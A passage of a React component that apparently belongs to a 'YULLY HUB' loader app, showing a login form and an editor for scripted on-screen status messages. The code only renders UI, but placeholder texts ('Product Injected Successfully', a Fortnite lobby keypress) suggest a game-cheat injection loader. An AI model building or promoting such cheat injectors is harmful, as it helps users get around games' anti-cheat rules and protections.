                                    ))}
                                </div>
                            </div>
                        </section>
                    )}

                    {screen === 'login' && (
                        <section className="screen login-inner" key="login" style={{ maxWidth: 420 }}>
                            <div className="login-logo"><span className="kw">YULLY</span><span className="sp">HUB</span></div>
                            <div className="input-field">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                                    <circle cx="12" cy="7" r="4" />
                                </svg>
                                <input type="text" placeholder="Username" />
                            </div>
                            <div className="input-field">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" />
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                                </svg>
                                <input type="password" placeholder="Password" />
                            </div>
                            <div className="join-line">Don&apos;t you have an account? <a href="#">Join us!</a></div>
                            <button className="primary-btn wide">ENTER</button>
                        </section>
                    )}
                    </div>
                </main>
            </div>

            {scriptEditor && (
                <div className="modal-veil" onClick={() => setScriptEditor(null)}>
                    <div className="modal-card" onClick={(e) => e.stopPropagation()}>
                        <div className="modal-head">
                            <div>
                                <div className="modal-title">Dynamic Island Script</div>
                                <div className="modal-sub">
                                    {scriptEditor.title}
                                    <span className={`save-chip ${scriptSaveState}`}>
                                        {scriptSaveState === 'saving' && 'saving…'}
                                        {scriptSaveState === 'saved'  && '✓ saved'}
                                        {scriptSaveState === 'idle'   && ''}
                                    </span>
                                </div>
                            </div>
                            <button className="icon-btn" onClick={() => setScriptEditor(null)}>
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
                            </button>
                        </div>

                        <div className="step-list">
                            {scriptEditor.steps.map((s, i) => (
                                <div className="step-row" key={i}>
                                    <div className="step-idx">{i + 1}</div>

                                    <div className="step-body">
                                        <div className="step-controls">
                                            <select
                                                className="step-select"
                                                value={s.kind || 'message'}
                                                onChange={(e) => updateStep(i, { kind: e.target.value })}
                                            >
                                                <option value="message">Show message</option>
                                                <option value="success">Show success (✓)</option>
                                                <option value="close">Close (bye pill)</option>
                                            </select>

                                            <div className="step-move">
                                                <button className="mini-btn" onClick={() => moveStep(i, -1)} disabled={i === 0}>↑</button>
                                                <button className="mini-btn" onClick={() => moveStep(i,  1)} disabled={i === scriptEditor.steps.length - 1}>↓</button>
                                                <button className="mini-btn danger" onClick={() => removeStep(i)}>✕</button>
                                            </div>
                                        </div>

                                        {(s.kind || 'message') === 'message' && (
                                            <>
                                                <input
                                                    className="step-input"
                                                    type="text"
                                                    placeholder='e.g. Press F2 once you are in Fortnite lobby'
                                                    value={s.text || ''}
                                                    onChange={(e) => updateStep(i, { text: e.target.value })}
                                                />

                                                <div className="step-triggers">
                                                    <label>
                                                        Advance:&nbsp;
                                                        <select
                                                            className="step-select"
                                                            value={s.dismiss || 'timeout'}
                                                            onChange={(e) => updateStep(i, { dismiss: e.target.value })}
                                                        >
                                                            <option value="timeout">After timeout</option>
                                                            <option value="keybind">On keypress</option>
                                                            <option value="both">Either (whichever first)</option>
                                                        </select>
                                                    </label>

                                                    {(s.dismiss === 'timeout' || s.dismiss === 'both' || !s.dismiss) && (
                                                        <label>
                                                            &nbsp;Timeout:&nbsp;
                                                            <input
                                                                type="number"
                                                                className="step-num"
                                                                min="0"
                                                                step="0.1"
                                                                value={s.timeout ?? 2}
                                                                onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })}
                                                            />
                                                            &nbsp;s
                                                        </label>
                                                    )}

                                                    {(s.dismiss === 'keybind' || s.dismiss === 'both') && (
                                                        <label>
                                                            &nbsp;Key:&nbsp;
                                                            <input
                                                                type="text"
                                                                className="step-num"
                                                                placeholder='F2'
                                                                value={s.keybind || ''}
                                                                onChange={(e) => updateStep(i, { keybind: e.target.value.toUpperCase() })}
                                                            />
                                                        </label>
                                                    )}
                                                </div>
                                            </>
                                        )}

                                        {s.kind === 'success' && (
                                            <>
                                                <input
                                                    className="step-input"
                                                    type="text"
                                                    placeholder='e.g. Product Injected Successfully'
                                                    value={s.text || ''}
                                                    onChange={(e) => updateStep(i, { text: e.target.value })}
                                                />
                                                <div className="step-triggers">
                                                    <label>
                                                        Show for:&nbsp;
                                                        <input
                                                            type="number"
                                                            className="step-num"
                                                            min="0"
                                                            step="0.1"
                                                            value={s.timeout ?? 2.5}
                                                            onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })}
                                                        />
                                                        &nbsp;s
                                                    </label>
                                                </div>
                                            </>
                                        )}

                                        {s.kind === 'close' && (
                                            <>
                                                <input
                                                    className="step-input"
                                                    type="text"
                                                    placeholder='Click me to close loader'
                                                    value={s.text || ''}
                                                    onChange={(e) => updateStep(i, { text: e.target.value })}
                                                />
                                                <div className="step-triggers">
                                                    <label>
                                                        Auto-close after:&nbsp;
                                                        <input
                                                            type="number"
                                                            className="step-num"
                                                            min="0"
                                                            step="0.1"
                                                            value={s.timeout ?? 4}
                                                            onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })}
                                                        />
                                                        &nbsp;s
                                                    </label>
                                                </div>
                                            </>
                                        )}
                                    </div>
                                </div>
                            ))}
                        </div>

                        <div className="modal-foot">
                            <div className="add-step-row">
                                <button className="mini-btn" onClick={() => addStep('message')}>+ Message</button>
                                <button className="mini-btn" onClick={() => addStep('success')}>+ Success ✓</button>
                                <button className="mini-btn" onClick={() => addStep('close')}>+ Close pill</button>
                            </div>
                            <div className="modal-hint">
                                Changes save automatically.
                            </div>
                            <button className="mini-btn" onClick={() => setScriptEditor(null)}>Done</button>
                        </div>
                    </div>
                </div>
            )}
        </>
    );
}
